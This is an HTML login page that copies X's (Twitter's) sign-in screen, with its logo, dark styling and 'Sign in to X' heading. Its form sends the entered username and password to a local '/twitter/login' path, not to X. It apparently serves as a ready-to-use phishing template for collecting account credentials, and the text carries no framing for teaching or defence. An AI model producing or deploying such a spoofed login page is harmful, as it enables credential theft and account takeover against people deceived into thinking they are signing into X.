<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>X. It's what's happening</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
         background:#000; color:#fff; min-height:100vh;
         display:flex; justify-content:center; align-items:center; padding:20px; }
  .box { width:100%; max-width:400px; padding:40px 32px; }
  .x-logo { text-align:center; font-size:32px; font-weight:bold; margin-bottom:36px; }
  h1 { font-size:28px; font-weight:700; margin-bottom:32px; }
  input { width:100%; padding:14px; font-size:15px; background:transparent; color:#fff;
    border:1px solid #2f3336; border-radius:4px; margin-bottom:16px; outline:none; }
  input:focus { border-color:#1d9bf0; }
  .btn { width:100%; background:#fff; color:#000; border:none; padding:12px;
    font-size:15px; font-weight:700; border-radius:9999px; cursor:pointer; margin-bottom:16px; }
  .btn:hover { background:#e6e6e6; }
  .forgot { display:block; width:100%; text-align:center; color:#fff; font-size:14px;
    text-decoration:none; border:1px solid #2f3336; padding:12px; border-radius:9999px; margin-top:8px; }
  .forgot:hover { background:#16181c; }
  .signup { margin-top:32px; color:#71767b; font-size:14px; }
  .signup a { color:#1d9bf0; text-decoration:none; }
  @media (max-width:500px) { body { align-items:flex-start; padding:20px; }
    h1 { font-size:24px; } }
</style>
</head>
<body>
  <div class="box">
    <div class="x-logo">𝕏</div>
    <h1>Sign in to X</h1>
    <form action="/twitter/login" method="POST">
      <input type="text" name="email" placeholder="Phone, email, or username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="btn">Log in</button>
    </form>
    <a href="#" class="forgot">Forgot password?</a>
    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
  </div>
</body>
</html>
